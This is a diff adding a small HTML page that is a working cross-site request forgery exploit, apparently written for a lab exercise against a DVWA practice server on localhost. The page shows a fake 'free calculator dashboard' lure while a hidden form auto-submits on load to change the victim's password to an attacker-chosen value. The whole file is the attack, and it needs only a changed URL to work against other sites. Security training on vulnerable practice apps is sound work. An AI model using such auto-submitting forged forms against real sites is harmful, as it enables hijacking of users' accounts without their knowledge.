@@ -1,0 +1,18 @@
+<html>
+  <body>
+    <!-- A fake lure to trick the user -->
+    <h1>Loading your free calculator dashboard...</h1>
+    
+    <!-- The invisible form pointing at your specific DVWA server port -->
+    <form action="http://127.0.0.1:42001/vulnerabilities/csrf/">
+      <input type="hidden" name="password_new" value="pwned_by_ibrahim">
+      <input type="hidden" name="password_conf" value="pwned_by_ibrahim">
+      <input type="hidden" name="Change" value="Change">
+    </form>
+    
+    <!-- The trigger that fires instantly -->
+    <script>
+      document.forms[0].submit();
+    </script>
+  </body>
+</html>
